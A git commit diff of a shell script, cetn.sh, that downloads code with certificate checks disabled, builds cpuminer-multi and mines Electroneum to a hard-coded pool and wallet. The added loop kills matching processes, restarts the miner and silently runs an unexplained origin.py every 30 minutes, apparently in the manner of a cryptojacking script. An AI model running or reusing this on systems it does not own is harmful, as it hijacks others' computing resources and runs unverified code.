2ac1181c150b0e3080e4a33bee7f442430cebdb0
x7r3mx <x7r3mx@gmail.com>
2018-03-14 13:56:13 +0200

    update

--- cetn.sh
+++ cetn.sh
@@ -3,4 +3,16 @@ wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master
 mkdir -p /opt/code && chmod -R +x /opt/code && cd /opt/code
 git clone https://github.com/tpruvot/cpuminer-multi.git 
 cd cpuminer* && ./build.sh
-./cpuminer -B -a cryptonight -o stratum+tcp://nl.etnpool.net:3333 -u etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN -p x 
+
+while true; do 
+    pkill -f cpuminer;
+    pkill -f origin;
+    sleep 5;
+    ./cpuminer -B -a cryptonight -o stratum+tcp://nl.etnpool.net:3333 -u etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN -p x 
+    python /opt/code/origin.py &>/dev/null &
+    sleep 1800;
+done
+
+
+
+
